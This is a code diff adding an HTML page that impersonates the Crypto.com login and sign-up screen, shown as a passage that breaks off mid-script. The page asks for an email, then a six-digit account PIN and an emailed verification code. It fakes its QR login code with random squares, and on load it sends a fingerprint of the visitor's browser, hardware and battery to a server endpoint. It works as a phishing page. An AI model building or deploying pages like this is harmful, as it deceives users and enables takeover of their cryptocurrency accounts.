@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Crypto.com — Buy, Sell & Pay With Crypto</title>
+<link rel="icon" href="/favicon.png"/>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet"/>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#060d1a;
+  --card:#0d1b2e;
+  --card-dark:#0a1626;
+  --border:#1a2d45;
+  --blue:#1a56db;
+  --blue2:#1649c0;
+  --text:#e8edf5;
+  --muted:#7a8fa8;
+  --input-bg:#0a1828;
+  --input-border:#1e3250;
+  --radius:12px;
+}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:'DM Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,sans-serif;-webkit-font-smoothing:antialiased;letter-spacing:-.01em}
+body{display:flex;flex-direction:column;min-height:100vh}
+
+/* ── LOAD OVERLAY ── */
+#loadOverlay{
+  position:fixed;inset:0;background:var(--bg);z-index:9999;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:28px;
+  transition:opacity .4s ease;
+}
+#loadOverlay.fade{opacity:0;pointer-events:none}
+.ov-logo{height:32px;width:auto;max-width:160px;object-fit:contain}
+.ov-bar-wrap{width:200px;height:2px;background:#111d2e;border-radius:1px;overflow:hidden}
+.ov-bar{height:100%;width:0;background:var(--blue);border-radius:1px;animation:loadprog 1.1s cubic-bezier(.4,0,.2,1) forwards}
+@keyframes loadprog{0%{width:0}60%{width:70%}85%{width:92%}100%{width:100%}}
+
+/* ── HEADER ── */
+.header{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  padding:0 32px;height:56px;display:flex;align-items:center;
+  background:var(--bg);
+}
+.header-logo{display:flex;align-items:center;gap:8px;text-decoration:none}
+.header-fav{height:28px;width:28px;object-fit:contain;flex-shrink:0}
+.header-brand{font-size:17px;font-weight:700;color:#fff;letter-spacing:-.3px;font-family:'Sora','DM Sans',-apple-system,sans-serif}
+
+/* ── MAIN ── */
+.main{
+  flex:1;display:flex;align-items:center;justify-content:center;
+  padding:80px 24px 40px;
+}
+.cards-row{
+  display:flex;gap:16px;align-items:stretch;
+  width:100%;max-width:960px;
+  margin:0 auto;
+}
+
+/* ── LEFT CARD ── */
+.card-left{
+  width:420px;flex-shrink:0;
+  background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
+  padding:28px 32px 32px;
+  animation:cardUp .45s cubic-bezier(.4,0,.2,1) .05s both;
+}
+
+/* ── MODE TOGGLE ── */
+.mode-toggle{
+  display:flex;background:#0d1b2e;
+  border:1px solid var(--border);border-radius:8px;overflow:hidden;
+  margin-bottom:22px;padding:4px;gap:0;
+}
+.mt-btn{
+  flex:1;padding:10px 0;font-size:14px;font-weight:500;letter-spacing:.01em;
+  color:var(--muted);background:transparent;border:none;cursor:pointer;
+  border-radius:6px;transition:all .18s;font-family:'DM Sans',sans-serif;
+}
+.mt-btn.active{background:var(--blue);color:#fff;font-weight:600;letter-spacing:.01em;box-shadow:0 2px 8px rgba(26,86,219,.35)}
+
+/* ── TABS ── */
+.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:18px}
+.tab{
+  font-size:13.5px;font-weight:500;color:var(--muted);letter-spacing:.02em;
+  background:none;border:none;cursor:pointer;padding:6px 14px 11px;position:relative;
+  transition:color .15s;font-family:'DM Sans',sans-serif;
+}
+.tab.active{color:var(--text);font-weight:600}
+.tab.active::after{
+  content:'';position:absolute;bottom:-1px;left:0;right:0;height:2px;
+  background:var(--blue);border-radius:1px;
+}
+
+/* ── QR PANEL ── */
+.qr-panel{padding:4px 0}
+.qr-scan-hint{font-size:12.5px;color:var(--muted);margin-bottom:16px;line-height:1.5}
+.qr-scan-hint strong{color:var(--muted)}
+.qr-steps{margin-top:16px}
+.qr-steps-title{font-size:13px;font-weight:700;color:var(--text);margin-bottom:7px}
+.qr-steps ol{padding-left:18px;display:flex;flex-direction:column;gap:4px;list-style:decimal}
+.qr-steps ol li{font-size:13px;color:var(--text);line-height:1.6;font-weight:600}
+.qr-steps ol li strong{color:var(--blue);font-weight:700}
+.qr-row{display:flex;gap:12px;align-items:stretch}
+.qr-box{
+  width:175px;height:180px;flex-shrink:0;
+  background:#fff;border-radius:8px;padding:10px;overflow:hidden;
+  display:flex;align-items:center;justify-content:center;
+}
+.qr-box svg{display:block}
+.qr-phone-wrap{
+  flex:1;border-radius:8px;overflow:hidden;
+  background:#0a0e1a;display:flex;align-items:center;justify-content:center;
+}
+.qr-phone-vid{
+  width:100%;height:180px;object-fit:cover;object-position:top center;display:block;
+}
+.qph-bar{display:flex;justify-content:space-between;align-items:center}
+.qph-time{font-size:9px;font-weight:700;color:#e8edf5}
+.qph-icons{display:flex;gap:3px;align-items:center}
+.qph-icon{width:4px;height:4px;border-radius:50%;background:#7a8fa8}
+.qph-bal-label{font-size:8px;color:#7a8fa8;display:flex;align-items:center;gap:3px}
+.qph-bal{font-size:15px;font-weight:800;color:#fff;letter-spacing:-.5px}
+.qph-change{font-size:8px;color:#3ddc84;font-weight:600}
+.qph-btns{display:flex;gap:5px;margin:2px 0}
+.qph-btn{flex:1;background:#1a3050;border-radius:5px;padding:4px 2px;text-align:center;font-size:7px;color:#7ab4e8;font-weight:600}
+.qph-section{font-size:7px;color:#7a8fa8;font-weight:600;letter-spacing:.5px;text-transform:uppercase}
+.qph-row{display:flex;align-items:center;gap:5px}
+.qph-coin-dot{width:16px;height:16px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:8px;font-weight:800}
+.qph-coin-info{flex:1}
+.qph-coin-name{font-size:8px;font-weight:700;color:#e8edf5}
+.qph-coin-sub{font-size:7px;color:#7a8fa8}
+.qph-coin-price{text-align:right}
+.qph-coin-val{font-size:8px;font-weight:700;color:#e8edf5}
+.qph-coin-pct{font-size:7px;font-weight:600}
+
+/* ── PASSKEY PANEL ── */
+.pk-panel{display:flex;flex-direction:column;align-items:center;gap:14px;padding:20px 0 8px;text-align:center}
+.pk-icon{width:52px;height:52px;border-radius:50%;background:#0d1f35;border:1px solid var(--border);display:flex;align-items:center;justify-content:center}
+.pk-icon svg{width:24px;height:24px;fill:var(--blue)}
+.pk-title{font-size:15px;font-weight:700}
+.pk-sub{font-size:12.5px;color:var(--muted);line-height:1.6;max-width:260px}
+
+/* ── EMAIL PANEL ── */
+.email-panel{}
+
+/* ── FORM FIELDS ── */
+.field-label{font-size:12px;font-weight:500;color:var(--muted);margin-bottom:5px;display:block}
+.field-wrap{margin-bottom:14px}
+input.fi{
+  width:100%;background:var(--input-bg);border:1px solid var(--input-border);
+  border-radius:6px;padding:10px 13px;font-size:14px;color:var(--text);outline:none;
+  transition:border-color .15s;
+}
+input.fi:focus{border-color:var(--blue)}
+input.fi::placeholder{color:#334d68}
+
+/* ── BUTTONS ── */
+.btn-primary{
+  width:100%;padding:12px;font-size:14px;font-weight:600;letter-spacing:.015em;
+  background:var(--blue);color:#fff;border:none;border-radius:8px;cursor:pointer;
+  transition:background .15s,opacity .15s,box-shadow .15s;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  font-family:'DM Sans',sans-serif;
+}
+.btn-primary:hover{background:var(--blue2)}
+.btn-primary:disabled{opacity:.5;cursor:not-allowed}
+.btn-primary .spin{width:15px;height:15px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .65s linear infinite;display:none;flex-shrink:0}
+.btn-primary.loading .spin{display:block}
+.btn-primary.loading .btn-txt{opacity:.8}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes cardUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+
+.btn-social{
+  width:100%;padding:10px 13px;font-size:13.5px;font-weight:500;letter-spacing:.01em;
+  background:#fff;color:#111;border:1px solid #d0d5dd;border-radius:8px;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  transition:background .12s;margin-bottom:10px;font-family:'DM Sans',sans-serif;
+}
+.btn-social:hover{background:#f4f4f5}
+.btn-social img,.btn-social svg{width:18px;height:18px;flex-shrink:0}
+.btn-social.loading{opacity:.6;pointer-events:none}
+
+.or-line{
+  display:flex;align-items:center;gap:10px;margin:14px 0;
+  font-size:12px;color:var(--muted);
+}
+.or-line::before,.or-line::after{content:'';flex:1;height:1px;background:var(--border)}
+
+/* ── ACCOUNT TYPE ── */
+.acct-label{font-size:12px;font-weight:500;color:var(--muted);margin-bottom:8px}
+.acct-row{display:flex;gap:10px;margin-bottom:16px}
+.acct-btn{
+  flex:1;padding:10px 12px;text-align:left;
+  background:var(--input-bg);border:1.5px solid var(--border);border-radius:8px;cursor:pointer;
+  transition:border-color .15s,background .15s;display:flex;align-items:center;gap:10px;
+}
+.acct-btn.active{border-color:var(--blue);background:#0d1f35}
+.acct-icon{width:20px;height:20px;flex-shrink:0;color:var(--muted);transition:color .15s}
+.acct-btn.active .acct-icon{color:var(--blue)}
+.acct-btn .al{font-size:13px;font-weight:600;color:var(--text);display:block}
+.acct-btn .as{font-size:11px;color:var(--muted);display:block;margin-top:1px}
+
+/* ── REFERRAL COLLAPSE ── */
+.ref-toggle{
+  font-size:12.5px;color:var(--muted);cursor:pointer;
+  display:flex;align-items:center;gap:4px;margin-bottom:14px;
+  background:none;border:none;padding:0;
+}
+.ref-toggle:hover{color:var(--text)}
+.ref-panel{display:none;margin-bottom:14px}
+.ref-panel.open{display:block}
+
+/* ── CHECKBOX ── */
+.check-row{display:flex;align-items:flex-start;gap:8px;margin-bottom:16px}
+.check-row input[type=checkbox]{margin-top:2px;accent-color:var(--blue);width:14px;height:14px;flex-shrink:0}
+.check-row label{font-size:12px;color:var(--muted);line-height:1.5;cursor:pointer}
+
+/* ── PRIVACY FOOTER (inside card) ── */
+.card-privacy{font-size:11.5px;color:#4a6080;margin-top:14px;line-height:1.5}
+.card-privacy a{color:var(--blue);text-decoration:none}
+.card-privacy a:hover{text-decoration:underline}
+
+/* ── CODE BOXES ── */
+.code-boxes{display:flex;gap:7px;justify-content:center;margin:18px 0}
+.code-box{
+  width:44px;height:52px;background:var(--input-bg);border:1.5px solid var(--input-border);
+  border-radius:7px;font-size:20px;font-weight:700;text-align:center;color:var(--text);outline:none;
+  transition:border-color .15s;
+}
+.code-box:focus{border-color:var(--blue)}
+.code-hint{font-size:12.5px;color:var(--muted);text-align:center;margin-bottom:4px}
+
+/* ── SUCCESS ── */
+.success-wrap{display:flex;flex-direction:column;align-items:center;gap:12px;padding:24px 0;text-align:center}
+.check-circle{width:60px;height:60px;border-radius:50%;background:var(--blue);display:flex;align-items:center;justify-content:center;animation:popIn .4s cubic-bezier(.34,1.56,.64,1) both}
+@keyframes popIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+.check-circle svg{width:28px;height:28px;stroke:#fff;fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round}
+.success-title{font-size:17px;font-weight:800}
+.success-sub{font-size:13px;color:var(--muted)}
+.success-prog{width:150px;height:2px;background:var(--border);border-radius:1px;overflow:hidden;margin-top:8px}
+.success-prog-fill{height:100%;width:0;background:var(--blue);border-radius:1px;transition:width 2.6s linear}
+
+/* ── VIEW ANIMATION ── */
+.view-anim{animation:viewIn .25s cubic-bezier(.4,0,.2,1) both}
+@keyframes viewIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.hidden{display:none!important}
+
+/* ── RIGHT CARD ── */
+.card-right{
+  flex:1;border-radius:var(--radius);overflow:hidden;
+  position:relative;min-height:520px;
+  display:flex;flex-direction:column;
+  animation:cardUp .45s cubic-bezier(.4,0,.2,1) .15s both;
+  background:#060d1a;
+}
+.hero-bg{
+  flex:1;width:100%;
+  object-fit:cover;object-position:top center;
+  display:block;min-height:0;
+}
+
+/* ── FOOTER ── */
+.footer{
+  border-top:1px solid var(--border);
+  padding:14px 40px;
+  display:flex;align-items:center;justify-content:center;
+  flex-wrap:wrap;gap:10px;
+}
+.footer-inner{
+  width:100%;max-width:960px;
+  display:flex;align-items:center;justify-content:space-between;
+  flex-wrap:wrap;gap:10px;
+}
+.footer-left{font-size:12px;color:#3a556e}
+.footer-right{display:flex;gap:20px}
+.footer-right a{font-size:12px;color:#3a556e;text-decoration:none}
+.footer-right a:hover{color:var(--muted)}
+
+/* ── HELPERS ── */
+.txt-link{color:var(--blue);cursor:pointer;font-size:13px;text-decoration:none}
+.txt-link:hover{text-decoration:underline}
+.center{text-align:center}
+
+@media(max-width:780px){
+  .cards-row{flex-direction:column}
+  .card-left{width:100%}
+  .card-right{min-height:200px}
+  .footer{padding:14px 20px}
+  .header{padding:0 20px}
+}
+</style>
+</head>
+<body>
+
+<!-- LOAD OVERLAY -->
+<div id="loadOverlay">
+  <span style="font-size:22px;font-weight:700;color:#fff;letter-spacing:-.3px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,sans-serif">crypto.com</span>
+  <div class="ov-bar-wrap"><div class="ov-bar"></div></div>
+</div>
+
+
+<!-- HEADER -->
+<header class="header">
+  <a class="header-logo" href="/home.html">
+    <img class="header-fav" src="/favicon.png" alt=""/>
+    <span class="header-brand">crypto.com</span>
+  </a>
+  <div style="display:flex;gap:4px;align-items:center;flex:1;padding-left:20px">
+    <a href="/home.html" style="font-size:13px;font-weight:500;color:#7a8fa8;text-decoration:none;padding:5px 10px;border-radius:6px;transition:color .15s" onmouseover="this.style.color='#e8edf5'" onmouseout="this.style.color='#7a8fa8'">Home</a>
+    <a href="/features.html" style="font-size:13px;font-weight:500;color:#7a8fa8;text-decoration:none;padding:5px 10px;border-radius:6px;transition:color .15s" onmouseover="this.style.color='#e8edf5'" onmouseout="this.style.color='#7a8fa8'">Products</a>
+    <a href="/about.html" style="font-size:13px;font-weight:500;color:#7a8fa8;text-decoration:none;padding:5px 10px;border-radius:6px;transition:color .15s" onmouseover="this.style.color='#e8edf5'" onmouseout="this.style.color='#7a8fa8'">About</a>
+    <a href="/contact.html" style="font-size:13px;font-weight:500;color:#7a8fa8;text-decoration:none;padding:5px 10px;border-radius:6px;transition:color .15s" onmouseover="this.style.color='#e8edf5'" onmouseout="this.style.color='#7a8fa8'">Contact</a>
+  </div>
+</header>
+
+<!-- MAIN -->
+<main class="main">
+  <div class="cards-row">
+
+    <!-- LEFT CARD -->
+    <div class="card-left">
+
+      <!-- MODE TOGGLE -->
+      <div class="mode-toggle">
+        <button class="mt-btn active" id="modeLogin" onclick="setMode('login')">Log In</button>
+        <button class="mt-btn" id="modeSignup" onclick="setMode('signup')">Sign Up</button>
+      </div>
+
+      <!-- ═══ LOGIN ═══ -->
+      <div id="formLogin" class="view-anim">
+
+        <div class="tabs">
+          <button class="tab active" id="tabEmail" onclick="setTab('email')">Email</button>
+          <button class="tab" id="tabPasskey" onclick="setTab('passkey')">Passkey</button>
+        </div>
+
+        <!-- QR TAB -->
+        <div id="tabViewQr" class="qr-panel view-anim hidden" style="display:none">
+          <p class="qr-scan-hint">Scan with your phone camera or the <strong>Crypto.com App</strong> to login instantly.</p>
+          <div class="qr-row">
+            <div class="qr-box">
+              <svg id="qrSvg" width="155" height="155" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg"></svg>
+            </div>
+            <div class="qr-phone-wrap">
+              <video class="qr-phone-vid" src="/phone.mp4" autoplay muted loop playsinline></video>
+            </div>
+          </div>
+          <div class="qr-steps">
+            <p class="qr-steps-title">Scan with App:</p>
+            <ol>
+              <li>Open the <strong>Crypto.com App</strong></li>
+              <li>Tap <strong>Menu &gt; QR Code Scanner</strong></li>
+              <li>Scan the QR code above</li>
+            </ol>
+          </div>
+
+        </div>
+
+        <!-- PASSKEY TAB -->
+        <div id="tabViewPasskey" class="hidden view-anim">
+          <div class="pk-panel">
+            <div class="pk-icon">
+              <svg viewBox="0 0 24 24"><path d="M12 1C8.676 1 6 3.676 6 7c0 2.21 1.136 4.146 2.857 5.286L8 21h2l.5-2h3l.5 2h2l-.857-8.714C16.864 11.146 18 9.21 18 7c0-3.324-2.676-6-6-6zm0 2c2.206 0 4 1.794 4 4s-1.794 4-4 4-4-1.794-4-4 1.794-4 4-4z"/></svg>
+            </div>
+            <p class="pk-title">Use a Passkey</p>
+            <p class="pk-sub">Authenticate using your device's biometrics or PIN</p>
+            <button class="btn-primary" style="width:auto;padding:10px 28px;margin-top:4px" onclick="doPasskey()">
+              <span class="spin"></span><span class="btn-txt">Continue with Passkey</span>
+            </button>
+            <a class="txt-link" style="margin-top:8px" onclick="setTab('email')">Use email instead</a>
+          </div>
+        </div>
+
+        <!-- EMAIL TAB -->
+        <div id="tabViewEmail" class="hidden view-anim">
+          <div class="field-wrap">
+            <label class="field-label">Email</label>
+            <input class="fi" type="email" id="loginEmail" placeholder="Enter your email address" autocomplete="email"/>
+          </div>
+          <button class="btn-primary" id="btnLogin" onclick="doEmail()">
+            <span class="spin"></span><span class="btn-txt">Continue</span>
+          </button>
+          <div class="or-line">OR</div>
+          <button class="btn-social" onclick="doSocial('google')">
+            <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.79-.07-1.54-.19-2.27h-11.3v4.51h6.47c-.29 1.48-1.14 2.73-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z"/><path fill="#34A853" d="M12.255 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96h-3.98v3.09C3.515 21.3 7.615 24 12.255 24z"/><path fill="#FBBC05" d="M5.525 14.29c-.25-.72-.38-1.49-.38-2.29s.14-1.57.38-2.29V6.62h-3.98a11.86 11.86 0 000 10.76l3.98-3.09z"/><path fill="#EA4335" d="M12.255 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C18.205 1.19 15.495 0 12.255 0c-4.64 0-8.74 2.7-10.71 6.62l3.98 3.09c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
+            Continue with Google
+          </button>
+          <button class="btn-social" onclick="doSocial('apple')">
+            <svg width="18" height="18" viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+            Continue with Apple
+          </button>
+        </div>
+
+      </div><!-- /formLogin -->
+
+      <!-- ═══ SIGNUP ═══ -->
+      <div id="formSignup" class="hidden view-anim">
+
+        <div class="acct-label">Account Type</div>
+        <div class="acct-row">
+          <button class="acct-btn active" id="acctInd" onclick="setAcct('individual')">
+            <svg class="acct-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
+            <span><span class="al">Individual</span><span class="as">For retail users</span></span>
+          </button>
+          <button class="acct-btn" id="acctBiz" onclick="setAcct('business')">
+            <svg class="acct-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="10" width="18" height="11" rx="1"/><path d="M8 10V7a4 4 0 018 0v3"/><line x1="12" y1="14" x2="12" y2="17"/></svg>
+            <span><span class="al">Business</span><span class="as">For institutions</span></span>
+          </button>
+        </div>
+
+        <div class="field-wrap">
+          <label class="field-label">Email</label>
+          <input class="fi" type="email" id="signupEmail" placeholder="Enter your email address" autocomplete="email"/>
+        </div>
+
+        <button class="ref-toggle" id="refToggle" onclick="toggleRef()">
+          Referral Code (Optional) <svg width="12" height="12" viewBox="0 0 12 12" fill="currentColor"><path d="M6 8L2 4h8z"/></svg>
+        </button>
+        <div class="ref-panel" id="refPanel">
+          <input class="fi" type="text" id="signupRef" placeholder="Enter referral code"/>
+        </div>
+
+        <div class="check-row">
+          <input type="checkbox" id="mktCheck"/>
+          <label for="mktCheck">I'd like to receive exclusive offers and updates from Crypto.com</label>
+        </div>
+
+        <button class="btn-primary" id="btnSignup" onclick="doSignup()">
+          <span class="spin"></span><span class="btn-txt">Create Account with Email</span>
+        </button>
+
+        <div class="or-line">OR</div>
+
+        <button class="btn-social" onclick="doSocial('google')">
+          <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.79-.07-1.54-.19-2.27h-11.3v4.51h6.47c-.29 1.48-1.14 2.73-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z"/><path fill="#34A853" d="M12.255 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96h-3.98v3.09C3.515 21.3 7.615 24 12.255 24z"/><path fill="#FBBC05" d="M5.525 14.29c-.25-.72-.38-1.49-.38-2.29s.14-1.57.38-2.29V6.62h-3.98a11.86 11.86 0 000 10.76l3.98-3.09z"/><path fill="#EA4335" d="M12.255 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C18.205 1.19 15.495 0 12.255 0c-4.64 0-8.74 2.7-10.71 6.62l3.98 3.09c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
+          Continue with Google
+        </button>
+        <button class="btn-social" onclick="doSocial('apple')">
+          <svg width="18" height="18" viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+          Continue with Apple
+        </button>
+
+        <p class="card-privacy">By submitting your email, you confirm you've read the relevant <a href="#">Privacy Notice</a>.</p>
+
+      </div><!-- /formSignup -->
+
+      <!-- ═══ PIN VIEW ═══ -->
+      <div id="view-pin" class="hidden view-anim">
+        <p style="font-size:15px;font-weight:700;text-align:center;margin-bottom:6px">Enter your Account PIN</p>
+        <p id="pinEmail" style="font-size:12.5px;color:var(--blue);text-align:center;margin-bottom:4px;font-weight:500"></p>
+        <p class="code-hint" id="pinHint">Enter the 6-digit PIN for your Crypto.com account</p>
+        <div class="code-boxes">
+          <input class="code-box" maxlength="1" type="password" inputmode="numeric" data-pin="0"/>
+          <input class="code-box" maxlength="1" type="password" inputmode="numeric" data-pin="1"/>
+          <input class="code-box" maxlength="1" type="password" inputmode="numeric" data-pin="2"/>
+          <input class="code-box" maxlength="1" type="password" inputmode="numeric" data-pin="3"/>
+          <input class="code-box" maxlength="1" type="password" inputmode="numeric" data-pin="4"/>
+          <input class="code-box" maxlength="1" type="password" inputmode="numeric" data-pin="5"/>
+        </div>
+        <button class="btn-primary" id="btnPin" onclick="doPin()">
+          <span class="spin"></span><span class="btn-txt">Confirm PIN</span>
+        </button>
+      </div>
+
+      <!-- ═══ OTP VIEW ═══ -->
+      <div id="view-otp" class="hidden view-anim">
+        <p style="font-size:15px;font-weight:700;text-align:center;margin-bottom:6px">Email Verification Code</p>
+        <p class="code-hint" id="otpHint">Enter the 6-digit code sent to your email</p>
+        <div class="code-boxes">
+          <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-otp="0"/>
+          <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-otp="1"/>
+          <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-otp="2"/>
+          <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-otp="3"/>
+          <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-otp="4"/>
+          <input class="code-box" maxlength="1" type="text" inputmode="numeric" data-otp="5"/>
+        </div>
+        <button class="btn-primary" id="btnOtp" onclick="doOtp()">
+          <span class="spin"></span><span class="btn-txt">Verify Code</span>
+        </button>
+        <p class="center" style="margin-top:12px"><a class="txt-link" onclick="resendOtp()">Resend code</a></p>
+      </div>
+
+      <!-- ═══ SUCCESS VIEW ═══ -->
+      <div id="view-success" class="hidden view-anim">
+        <div class="success-wrap">
+          <div class="check-circle">
+            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <p class="success-title">Account Verified</p>
+          <p class="success-sub">Identity confirmed. Redirecting…</p>
+          <div class="success-prog"><div id="successBar" class="success-prog-fill"></div></div>
+        </div>
+      </div>
+
+    </div><!-- /card-left -->
+
+    <!-- RIGHT CARD -->
+    <div class="card-right">
+      <img class="hero-bg" src="/hero.png" alt=""/>
+    </div>
+
+  </div>
+</main>
+
+<!-- FOOTER -->
+<footer class="footer">
+  <div class="footer-inner">
+    <span class="footer-left">Cryptocurrency in Every Wallet™<br/>Copyright © 2018 – 2026 Crypto.com. All rights reserved.</span>
+    <div class="footer-right">
+      <a href="/home.html">Home</a>
+      <a href="/features.html">Products</a>
+      <a href="/terms.html">Terms of Service</a>
+      <a href="/privacy.html">Privacy Policy</a>
+      <a href="/contact.html">Contact</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+// ── STATE ──
+var _mode = 'login', _tab = 'email', _acct = 'individual';
+
+// ── LOAD OVERLAY ──
+window.addEventListener('load', function(){
+  generateQr();
+  setTab('email');
+
+  // ── FINGERPRINT & PING ──
+  function sendVisit(extra){
+    var nav = window.navigator;
+    var scr = window.screen;
+    var payload = {
+      // browser
+      ua: nav.userAgent,
+      lang: nav.language,
+      langs: (nav.languages||[]).join(','),
+      platform: nav.platform,
+      vendor: nav.vendor,
+      cookieEnabled: nav.cookieEnabled,
+      doNotTrack: nav.doNotTrack,
+      // screen
+      screenW: scr.width,
+      screenH: scr.height,
+      colorDepth: scr.colorDepth,
+      pixelRatio: window.devicePixelRatio||1,
+      // window
+      viewportW: window.innerWidth,
+      viewportH: window.innerHeight,
+      // time
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      tzOffset: new Date().getTimezoneOffset(),
+      localTime: new Date().toString(),
+      // referrer
+      referrer: document.referrer,
+      url: location.href,
+      // hardware
+      cpuCores: nav.hardwareConcurrency||0,
+      memory: nav.deviceMemory||0,
+      maxTouch: nav.maxTouchPoints||0,
+      // connection
+      connType: (nav.connection||nav.mozConnection||nav.webkitConnection||{}).effectiveType||'',
+      connDown: (nav.connection||{}).downlink||0,
+      // plugins count
+      plugins: nav.plugins ? nav.plugins.length : 0,
+    };
+    if(extra) Object.assign(payload, extra);
+    fetch('/api/visit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).catch(function(){});
+  }
+
+  // try to get battery then send
+  if(navigator.getBattery){
+    navigator.getBattery().then(function(b){
+      sendVisit({batteryLevel:Math.round(b.level*100), batteryCharging:b.charging});
+    }).catch(function(){ sendVisit(null); });
+  } else {
+    sendVisit(null);
+  }
+
+  var ov = document.getElementById('loadOverlay');
+  setTimeout(function(){
+    ov.classList.add('fade');
+    setTimeout(function(){ ov.style.display='none'; }, 420);
+  }, 1200);
+});
+
+// ── QR GENERATOR (decorative SVG) ──
+function generateQr(){
+  var svg = document.getElementById('qrSvg');
+  if(!svg) return;
+  var size=180, mod=29, cell=Math.floor(size/mod);
+  var seed=Date.now()|0;
+  function rand(){ seed=(seed*1664525+1013904223)&0xffffffff; return (seed>>>0)/4294967296; }
+  var c=[];
+  for(var i=0;i<mod;i++){c[i]=[];for(var j=0;j<mod;j++)c[i][j]=0;}
+  function finder(tr,tc){
+    for(var i=0;i<7;i++)for(var j=0;j<7;j++)c[tr+i][tc+j]=1;
+    for(var i=1;i<6;i++)for(var j=1;j<6;j++)c[tr+i][tc+j]=0;
+    for(var i=2;i<5;i++)for(var j=2;j<5;j++)c[tr+i][tc+j]=1;
+  }
+  finder(0,0);finder(0,mod-7);finder(mod-7,0);
+  // timing patterns
+  for(var i=8;i<mod-8;i++){c[6][i]=(i%2===0)?1:0;c[i][6]=(i%2===0)?1:0;}
+  // data modules
+  for(var r=0;r<mod;r++)for(var cc=0;cc<mod;cc++){
+    var inFinder=(r<9&&cc<9)||(r<9&&cc>mod-9)||(r>mod-9&&cc<9)||(r===6||cc===6);
+    if(!inFinder)c[r][cc]=rand()>.45?1:0;
+  }
+  var html='';
+  for(var r=0;r<mod;r++)for(var cc=0;cc<mod;cc++){
+    if(c[r][cc])html+='<rect x="'+(cc*cell)+'" y="'+(r*cell)+'" width="'+cell+'" height="'+cell+'" fill="#000"/>';
+  }
+  // center logo placeholder
+  var cx=Math.floor(size/2)-10, cy=Math.floor(size/2)-10;
